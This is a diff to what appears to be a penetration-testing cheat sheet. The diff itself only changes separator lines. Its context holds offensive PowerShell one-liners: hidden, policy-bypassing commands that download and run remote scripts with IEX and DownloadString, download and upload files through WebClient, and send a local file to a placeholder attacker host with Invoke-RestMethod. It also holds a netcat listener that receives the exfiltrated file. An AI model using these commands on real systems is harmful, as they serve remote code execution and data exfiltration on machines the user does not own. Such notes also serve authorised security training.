@@ -10,8 +10,7 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden IEX(New-Object Net.WebClient).D
 # In PowerShell:
 IEX((New-Object System.Net.WebClient).DownloadString('http://<LocalIPAddress>:<PORT>/FILE'))
 ```
-
-=========================================
+-----------------------------------------------------------------------------------------------------------------------------------------------------
 # Download File:
 ```ps
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
@@ -20,7 +19,7 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClien
 (New-Object System.Net.WebClient).DownloadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 ```
 
-=========================================
+-----------------------------------------------------------------------------------------------------------------------------------------------------
 # Upload File:
 ```ps
 powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
@@ -29,7 +28,7 @@ powershell.exe -Exec Bypass -NoP -NonI -W Hidden (New-Object System.Net.WebClien
 (New-Object System.Net.WebClient).UploadFile('http://<LocalIPAddress>:<PORT>/FILE', 'LocalFile')
 ```
 
----------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------
 # If you can't copy over SMB
 ## On Local Box
 nc -lnvp 443 > Out.File
@@ -37,7 +36,7 @@ nc -lnvp 443 > Out.File
 ```ps
 Invoke-RestMethod -Uri http://<LocalIPAddress>:<PORT>/<FILE> -Method Post -InFile <LocalFile>
 ```
-=========================================
+-----------------------------------------------------------------------------------------------------------------------------------------------------
 
 [+] EXTRA
 ## Upgrade PSH to 64-bit shell
